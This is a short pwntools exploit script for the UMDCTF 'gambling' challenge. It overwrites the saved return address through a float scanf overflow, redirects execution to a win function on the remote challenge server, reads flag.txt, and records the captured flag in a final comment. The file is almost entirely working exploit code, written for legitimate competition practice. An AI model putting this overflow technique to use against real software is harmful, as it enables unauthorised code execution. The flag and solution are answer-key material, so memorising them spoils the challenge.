from pwn import *
import struct

# overflow at variables is float but scanf("%lf") -> overwrite saved rip to win

e = ELF("./gambling")
context.binary = e

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *0x08049331
'''

p = remote("challs.umdctf.io", 31005)
#p = gdb.debug("./gambling", gdbscript = script)
#p = process("./gambling")
#debug()

win = 0x080492C0 << 32
val = struct.unpack('d', p64(win))[0]

print(struct.pack('d', val))

payload = b"1.1 " * 6 + str(val).encode()
p.sendlineafter(b"numbers: ", payload)

p.sendline(b"cat flag.txt")

p.interactive()
#UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}